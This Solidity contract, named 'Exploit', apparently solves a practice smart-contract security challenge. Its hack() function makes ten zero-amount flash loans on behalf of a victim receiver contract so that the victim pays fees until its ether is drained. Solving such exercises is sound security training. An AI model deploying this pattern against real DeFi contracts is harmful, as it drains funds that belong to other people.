pragma solidity ^0.6.0;

import "@openzeppelin/contracts/math/SafeMath.sol";
import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
import "@openzeppelin/contracts/utils/Address.sol";

interface INaiveReceiverLenderPool {
    function flashLoan(address payable borrower, uint256 borrowAmount) external;
}

contract Exploit {

    address payable public victim;

    INaiveReceiverLenderPool public naiveReceiverLenderPool;

    constructor(address _naiveReceiverLenderPool, address payable _victim) public {
        naiveReceiverLenderPool = INaiveReceiverLenderPool(_naiveReceiverLenderPool);
        victim = _victim;
    }

    function hack() external {
        for(uint256 i = 0; i < 10; i++) {
            naiveReceiverLenderPool.flashLoan(victim, 0 ether);
        }
    }

}
